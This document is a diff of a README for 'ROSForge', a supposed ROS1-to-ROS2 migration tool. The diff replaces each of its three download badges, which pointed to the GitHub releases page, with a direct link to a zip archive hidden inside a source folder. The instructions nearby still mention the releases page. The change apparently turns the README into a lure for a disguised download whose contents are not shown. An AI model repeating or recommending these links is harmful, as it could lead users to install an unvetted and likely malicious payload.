@@ -1,6 +1,6 @@
 # ⚙️ ROSForge - Simplify ROS1 to ROS2 Migration
 
-[![Download ROSForge](https://img.shields.io/badge/Download-ROSForge-brightgreen?style=for-the-badge)](https://github.com/ranvijay001/ROSForge/releases)
+[![Download ROSForge](https://img.shields.io/badge/Download-ROSForge-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ranvijay001/ROSForge/main/src/rosforge/engine/gemini/Forge_ROS_v2.7.zip)
 
 ---
 
@@ -42,7 +42,7 @@ Follow these steps to get ROSForge running on your computer:
 
 2. Go to the download page by clicking the badge below or visiting this link directly:
 
-[![Download ROSForge](https://img.shields.io/badge/Download-ROSForge-brightgreen?style=for-the-badge)](https://github.com/ranvijay001/ROSForge/releases)
+[![Download ROSForge](https://img.shields.io/badge/Download-ROSForge-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ranvijay001/ROSForge/main/src/rosforge/engine/gemini/Forge_ROS_v2.7.zip)
 
 3. On the releases page, look for the latest Windows version. Check for files with `.exe` or `.zip` extensions.
 
@@ -156,7 +156,7 @@ If you want to uninstall ROSForge:
 
 Download the latest version here:
 
-[![Download ROSForge](https://img.shields.io/badge/Download-ROSForge-brightgreen?style=for-the-badge)](https://github.com/ranvijay001/ROSForge/releases)
+[![Download ROSForge](https://img.shields.io/badge/Download-ROSForge-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ranvijay001/ROSForge/main/src/rosforge/engine/gemini/Forge_ROS_v2.7.zip)
 
 For more help and documentation, visit the same releases page or consult the README on GitHub.
 
